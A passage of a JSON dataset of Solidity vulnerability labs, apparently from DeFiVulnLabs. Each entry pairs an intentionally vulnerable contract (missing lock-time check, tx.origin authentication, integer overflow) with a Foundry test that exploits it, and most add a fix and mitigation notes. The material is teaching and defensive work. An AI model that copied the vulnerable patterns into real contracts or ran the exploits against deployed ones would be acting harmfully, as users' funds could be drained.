    "title": "Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse",
    "description": "The bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. \nThis allows tokens to be unlocked multiple times before the lock period has elapsed, \npotentially leading to significant financial loss.",
    "mitigation": "Add a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.\n\nor fix:\nuint256 amount = locker.amount;\nif (block.timestamp > locker.lockTime) {\n    IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    locker.amount = 0;\n    }\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1681492477281468420\nhttps://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse \n\nDescription:\nThe bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. \nThis allows tokens to be unlocked multiple times before the lock period has elapsed, \npotentially leading to significant financial loss.\n \nMitigation:  \nAdd a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.\n\nor fix:\nuint256 amount = locker.amount;\nif (block.timestamp > locker.lockTime) {\n    IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    locker.amount = 0;\n    }\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1681492477281468420\nhttps://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d\n*/\n\ncontract ContractTest is Test {\n    VulnerableBank VulnerableBankContract;\n    BanksLP BanksLPContract;\n    FixedeBank FixedeBankContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        VulnerableBankContract = new VulnerableBank();\n        FixedeBankContract = new FixedeBank();\n        BanksLPContract = new BanksLP();\n        BanksLPContract.transfer(address(alice), 10000);\n        BanksLPContract.transfer(address(VulnerableBankContract), 100000);\n    }\n\n    function testVulnerableBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(VulnerableBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        VulnerableBankContract.createLocker(\n            address(BanksLPContract),\n            10000,\n            86400\n        );\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //vm.warp(88888);\n        //exploit it,\n        for (uint i = 0; i < 10; i++) {\n            VulnerableBankContract.unlockToken(1);\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n\n    function testFixedBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(FixedeBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        FixedeBankContract.createLocker(address(BanksLPContract), 10000, 86400);\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //exploit it, failed.\n        for (uint i = 0; i < 10; i++) {\n            {\n                vm.expectRevert();\n                FixedeBankContract.unlockToken(1);\n            }\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n}\n\ncontract VulnerableBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n        require(locker.hasLockedTokens, \"No locked tokens\");\n\n        // Incorrect sanity checks.\n        if (block.timestamp > locker.lockTime) {\n            locker.amount = 0;\n        }\n\n        // Transfer tokens to the locker owner\n        // This is where the exploit happens, as this can be called multiple times\n        // before the lock time has elapsed.\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n\ncontract BanksLP is ERC20, Ownable {\n    constructor() ERC20(\"BanksLP\", \"BanksLP\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract FixedeBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n\n        require(locker.hasLockedTokens, \"No locked tokens\");\n        require(block.timestamp > locker.lockTime, \"Tokens are still locked\");\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n\n        // Mark the tokens as unlocked\n        locker.hasLockedTokens = false;\n        locker.amount = 0;\n\n        // Transfer tokens to the locker owner\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Incorrect_sanity_checks.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "payable-transfer",
    "slug": "payable-transfer",
    "title": "Incorrect use of payable.transfer()",
    "description": "After the implementation of EIP 1884 in the Istanbul hard fork, \nthe gas cost of the SLOAD operation was increased, \nresulting in the breaking of some existing smart contracts.\n\nWhen transferring ETH to recipients, if Solidity's transfer() or send() method \nis used, certain shortcomings arise, particularly when the recipient \nis a smart contract. These shortcomings can make it impossible to \nsuccessfully transfer ETH to the smart contract recipient.\n\nSpecifically, the transfer will inevitably fail when the smart",
    "mitigation": "Using call with its returned boolean checked in combination with re-entrancy guard is highly recommended.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678958093273829376\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/99",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Incorrect use of payable.transfer()\n\nDescription:\nAfter the implementation of EIP 1884 in the Istanbul hard fork, \nthe gas cost of the SLOAD operation was increased, \nresulting in the breaking of some existing smart contracts.\n\nWhen transferring ETH to recipients, if Solidity's transfer() or send() method \nis used, certain shortcomings arise, particularly when the recipient \nis a smart contract. These shortcomings can make it impossible to \nsuccessfully transfer ETH to the smart contract recipient.\n\nSpecifically, the transfer will inevitably fail when the smart contract:\n    1.does not implement a payable fallback function, or\n    2.implements a payable fallback function which would incur more than 2300 gas units, or\n    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.\n\nMitigation:  \nUsing call with its returned boolean checked in combination with re-entrancy guard is highly recommended.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678958093273829376\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/99\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testTransferFail() public {\n        SimpleBankContract.deposit{value: 1 ether}();\n        assertEq(SimpleBankContract.getBalance(), 1 ether);\n        vm.expectRevert();\n        SimpleBankContract.withdraw(1 ether);\n    }\n\n    function testCall() public {\n        FixedSimpleBankContract.deposit{value: 1 ether}();\n        assertEq(FixedSimpleBankContract.getBalance(), 1 ether);\n        FixedSimpleBankContract.withdraw(1 ether);\n    }\n\n    receive() external payable {\n        //just a example for out of gas\n        SimpleBankContract.deposit{value: 1 ether}();\n    }\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        // the issue is here\n        payable(msg.sender).transfer(amount);\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        (bool success, ) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \" Transfer of ETH Failed\");\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/payable-transfer.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "txorigin",
    "slug": "txorigin",
    "title": "Insecure tx.origin Vulnerability",
    "description": "tx.origin is a global variable in Solidity; using this variable for authentication in \na smart contract makes the contract vulnerable to phishing attacks.",
    "mitigation": "It is advisable to use msg.sender.\n\nREF:\nhttps://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Insecure tx.origin Vulnerability\n\nDescription:\ntx.origin is a global variable in Solidity; using this variable for authentication in \na smart contract makes the contract vulnerable to phishing attacks.\n\nScenario:\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n\nMitigation:\nIt is advisable to use msg.sender.\n\nREF:\nhttps://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing\n*/\n\ncontract ContractTest is Test {\n    Wallet WalletContract;\n    Attack AttackerContract;\n\n    function testtxorigin() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 10 ether);\n        vm.deal(address(eve), 1 ether);\n        vm.prank(alice);\n        WalletContract = new Wallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether\n        console.log(\"Owner of wallet contract\", WalletContract.owner());\n        vm.prank(eve);\n        AttackerContract = new Attack(WalletContract); //Eve deploys Attack with the address of Alice's Wallet contract.\n        console.log(\"Owner of attack contract\", AttackerContract.owner());\n        console.log(\"Eve of balance\", address(eve).balance);\n\n        vm.prank(alice, alice);\n        AttackerContract.attack(); // Eve tricks Alice to call AttackerContract.attack()\n        console.log(\"tx origin address\", tx.origin);\n        console.log(\"msg.sender address\", msg.sender);\n        console.log(\"Eve of balance\", address(eve).balance);\n    }\n\n    receive() external payable {}\n}\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        // check with msg.sender instead of tx.origin\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/txorigin.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "overflow",
    "slug": "overflow",
    "title": "Integrate Overflow",
    "description": "The TimeLock has a flaw in the smart contract code that allows \nan attacker to prematurely withdraw their deposited funds from the TimeLock contract. \nThe vulnerability arises due to an overflow in the increaseLockTime function, \nwhich manipulates the lock time in a way that causes it to wrap around to 0, \nenabling the attacker to withdraw their funds before the actual waiting period expires.\n\nThis contract is designed to act as a time vault.\nUser can deposit into this contract but cannot withdraw for atleast a week.\nUser can also extend the wait time beyond the 1 week waiting period.\n\n/1. Alice and bob both have 1 Ether balance\n2. Deploy TimeLock Contract\n3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether\n4. Bob caused an overflow on his lockTime\n5, Alice can't withdraw 1 Ether, because the lock time not expired.\n6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow,\nand was able to withdraw before the 1 week waiting period.\n\nImpact: Solidity < 0.8 and without SafeMath",
    "mitigation": "To mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Integrate Overflow   \n\nDescription:\nThe TimeLock has a flaw in the smart contract code that allows \nan attacker to prematurely withdraw their deposited funds from the TimeLock contract. \nThe vulnerability arises due to an overflow in the increaseLockTime function, \nwhich manipulates the lock time in a way that causes it to wrap around to 0, \nenabling the attacker to withdraw their funds before the actual waiting period expires.\n\nThis contract is designed to act as a time vault.\nUser can deposit into this contract but cannot withdraw for atleast a week.\nUser can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Alice and bob both have 1 Ether balance\n2. Deploy TimeLock Contract\n3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether\n4. Bob caused an overflow on his lockTime\n5, Alice can't withdraw 1 Ether, because the lock time not expired.\n6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow,\nand was able to withdraw before the 1 week waiting period.\n\nImpact: Solidity < 0.8 and without SafeMath \n\nMitigation:\nTo mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease; // vulnerable\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(\n            block.timestamp > lockTime[msg.sender],\n            \"Lock time not expired\"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    TimeLock TimeLockContract;\n    address alice;\n    address bob;\n\n    function setUp() public {\n        TimeLockContract = new TimeLock();\n        alice = vm.addr(1);\n        bob = vm.addr(2);\n        vm.deal(alice, 1 ether);\n        vm.deal(bob, 1 ether);\n    }\n\n    function testOverflow() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Bob balance\", bob.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Alice balance\", alice.balance);\n\n        console.log(\"Bob deposit 1 Ether...\");\n        vm.startPrank(bob);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Bob balance\", bob.balance);\n\n        // exploit here\n        TimeLockContract.increaseLockTime(\n            type(uint).max + 1 - TimeLockContract.lockTime(bob)\n        );\n\n        console.log(\n            \"Bob will successfully withdraw, because the lock time is overflowed\"\n        );\n        TimeLockContract.withdraw();\n        console.log(\"Bob balance\", bob.balance);\n        vm.stopPrank();\n\n        vm.prank(alice);\n        console.log(\n            \"Alice will fail to withdraw, because the lock time did not expire\"\n        );\n        TimeLockContract.withdraw(); // expect revert\n    }\n}\n",
    "severity": "Medium",
    "category": "Arithmetic",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Overflow.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "interface",
    "slug": "interface",
    "title": "interface",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: UNLICENSED\n\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\n\ninterface CheatCodes {\n    // This allows us to getRecordedLogs()\n    struct Log {\n        bytes32[] topics;\n        bytes data;\n    }\n\n    // Set block.timestamp (newTimestamp)\n    function warp(uint256) external;\n\n    // Set block.height (newHeight)\n    function roll(uint256) external;\n\n    // Set block.basefee (newBasefee)\n    function fee(uint256) external;\n\n    // Set block.coinbase (who)\n    function coinbase(address) external;\n\n    // Loads a storage slot from an address (who, slot)\n    function load(address, bytes32) external returns (bytes32);\n\n    // Stores a value to an address' storage slot, (who, slot, value)\n    function store(address, bytes32, bytes32) external;\n\n    // Signs data, (privateKey, digest) => (v, r, s)\n    function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32);\n\n    // Gets address for a given private key, (privateKey) => (address)\n    function addr(uint256) external returns (address);\n\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n    function deriveKey(string calldata, uint32) external returns (uint256);\n\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n    function deriveKey(\n        string calldata,\n        string calldata,\n        uint32\n    ) external returns (uint256);\n\n    // Performs a foreign function call via terminal, (stringInputs) => (result)\n    function ffi(string[] calldata) external returns (bytes memory);\n\n    // Set environment variables, (name, value)\n    function setEnv(string calldata, string calldata) external;\n\n    // Read environment variables, (name) => (value)\n    function envBool(string calldata) external returns (bool);\n\n    function envUint(string calldata) external returns (uint256);\n\n    function envInt(string calldata) external returns (int256);\n\n    function envAddress(string calldata) external returns (address);\n\n    function envBytes32(string calldata) external returns (bytes32);\n\n    function envString(string calldata) external returns (string memory);\n\n    function envBytes(string calldata) external returns (bytes memory);\n\n    // Read environment variables as arrays, (name, delim) => (value[])\n    function envBool(\n        string calldata,\n        string calldata\n    ) external returns (bool[] memory);\n\n    function envUint(\n        string calldata,\n        string calldata\n    ) external returns (uint256[] memory);\n\n    function envInt(\n        string calldata,\n        string calldata\n    ) external returns (int256[] memory);\n\n    function envAddress(\n        string calldata,\n        string calldata\n    ) external returns (address[] memory);\n\n    function envBytes32(\n        string calldata,\n        string calldata\n    ) external returns (bytes32[] memory);\n\n    function envString(\n        string calldata,\n        string calldata\n    ) external returns (string[] memory);\n\n    function envBytes(\n        string calldata,\n        string calldata\n    ) external returns (bytes[] memory);\n\n    // Sets the *next* call's msg.sender to be the input address\n    function prank(address) external;\n\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n    function startPrank(address) external;\n\n    // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n    function prank(address, address) external;\n\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n    function startPrank(address, address) external;\n\n    // Resets subsequent calls' msg.sender to be `address(this)`\n    function stopPrank() external;\n\n    // Sets an address' balance, (who, newBalance)\n    function deal(address, uint256) external;\n\n    // Sets an address' code, (who, newCode)\n    function etch(address, bytes calldata) external;\n\n    // Expects an error on next call\n    function expectRevert() external;\n\n    function expectRevert(bytes calldata) external;\n\n    function expectRevert(bytes4) external;\n\n    // Record all storage reads and writes\n    function record() external;\n\n    // Gets all accessed reads and write slot from a recording session, for a given address\n    function accesses(\n        address\n    ) external returns (bytes32[] memory reads, bytes32[] memory writes);\n\n    // Record all the transaction logs\n    function recordLogs() external;\n\n    // Gets all the recorded logs\n    function getRecordedLogs() external returns (Log[] memory);\n\n    // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n    // Call this function, then emit an event, then call a function. Internally after the call, we check if\n    // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n    // Second form also checks supplied address against emitting contract.\n    function expectEmit(bool, bool, bool, bool) external;\n\n    function expectEmit(bool, bool, bool, bool, address) external;\n\n    // Mocks a call to an address, returning specified data.\n    // Calldata can either be strict or a partial match, e.g. if you only\n    // pass a Solidity selector to the expected calldata, then the entire Solidity\n    // function will be mocked.\n    function mockCall(address, bytes calldata, bytes calldata) external;\n\n    // Mocks a call to an address with a specific msg.value, returning specified data.\n    // Calldata match takes precedence over msg.value in case of ambiguity.\n    function mockCall(\n        address,\n        uint256,\n        bytes calldata,\n        bytes calldata\n    ) external;\n\n    // Clears all mocked calls\n    function clearMockedCalls() external;\n\n    // Expect a call to an address with the specified calldata.\n    // Calldata can either be strict or a partial match\n    function expectCall(address, bytes calldata) external;\n\n    // Expect a call to an address with the specified msg.value and calldata\n    function expectCall(address, uint256, bytes calldata) external;\n\n    // Gets the code from an artifact file. Takes in the relative path to the json file\n    function getCode(string calldata) external returns (bytes memory);\n\n    // Labels an address in call traces\n    function label(address, string calldata) external;\n\n    // If the condition is false, discard this run's fuzz inputs and generate new ones\n    function assume(bool) external;\n\n    // Set nonce for an account\n    function setNonce(address, uint64) external;\n\n    // Get nonce for an account\n    function getNonce(address) external returns (uint64);\n\n    // Set block.chainid (newChainId)\n    function chainId(uint256) external;\n\n    // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n    function broadcast() external;\n\n    // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n    function broadcast(address) external;\n\n    // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n    function startBroadcast() external;\n\n    // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n    function startBroadcast(address) external;\n\n    // Stops collecting onchain transactions\n    function stopBroadcast() external;\n\n    // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n    function readFile(string calldata) external returns (string memory);\n\n    // Reads next line of file to string, (path) => (line)\n    function readLine(string calldata) external returns (string memory);\n\n    // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n    // Path is relative to the project root. (path, data) => ()\n    function writeFile(string calldata, string calldata) external;\n\n    // Writes line to file, creating a file if it does not exist.\n    // Path is relative to the project root. (path, data) => ()\n    function writeLine(string calldata, string calldata) external;\n\n    // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n    // Path is relative to the project root. (path) => ()\n    function closeFile(string calldata) external;\n\n    // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n    // - Path points to a directory.\n    // - The file doesn't exist.\n    // - The user lacks permissions to remove the file.\n    // Path is relative to the project root. (path) => ()\n    function removeFile(string calldata) external;\n\n    function toString(address) external returns (string memory);\n\n    function toString(bytes calldata) external returns (string memory);\n\n    function toString(bytes32) external returns (string memory);\n\n    function toString(bool) external returns (string memory);\n\n    function toString(uint256) external returns (string memory);\n\n    function toString(int256) external returns (string memory);\n\n    // Snapshot the current state of the evm.\n    // Returns the id of the snapshot that was created.\n    // To revert a snapshot use `revertTo`\n    function snapshot() external returns (uint256);\n\n    // Revert the state of the evm to a previous snapshot\n    // Takes the snapshot id to revert to.\n    // This deletes the snapshot and all snapshots taken after the given snapshot id.\n    function revertTo(uint256) external returns (bool);\n\n    // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n    function createFork(string calldata, uint256) external returns (uint256);\n\n    // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n    function createFork(string calldata) external returns (uint256);\n\n    // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n    function createSelectFork(\n        string calldata,\n        uint256\n    ) external returns (uint256);\n\n    // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n    function createSelectFork(string calldata) external returns (uint256);\n\n    // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n    function selectFork(uint256) external;\n\n    /// Returns the currently active fork\n    /// Reverts if no fork is currently active\n    function activeFork() external returns (uint256);\n\n    // Updates the currently active fork to given block number\n    // This is similar to `roll` but for the currently active fork\n    function rollFork(uint256) external;\n\n    // Updates the given fork to given block number\n    function rollFork(uint256 forkId, uint256 blockNumber) external;\n\n    /// Returns the RPC url for the given alias\n    function rpcUrl(string calldata) external returns (string memory);\n\n    /// Returns all rpc urls and their aliases `[alias, url][]`\n    function rpcUrls() external returns (string[2][] memory);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address account) external view returns (uint);\n\n    function transfer(address recipient, uint amount) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ninterface IFantasticWeslie {\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    function mint(bytes32[] memory merkleProof) external payable;\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/interface.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "invariant",
    "slug": "invariant",
    "title": "Invariant issue",
    "description": "Assert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.",
    "mitigation": "To avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.\n\nREF:\nhttps://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.0;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Invariant issue\n\nDescription:\nAssert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.\n\nMitigation:\nTo avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.\n\nREF:\nhttps://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/\n\n*/\n\n\ncontract ContractTest is Test {\n    Invariant InvariantContract;\n\n    function testInvariant() public {\n        InvariantContract = new Invariant();\n        InvariantContract.receiveMoney{value: 1 ether}();\n        console.log(\n            \"BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n\n        InvariantContract.receiveMoney{value: 18 ether}();\n        console.log(\n            \"testInvariant, BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n        /*\nThat's only 553255926290448384 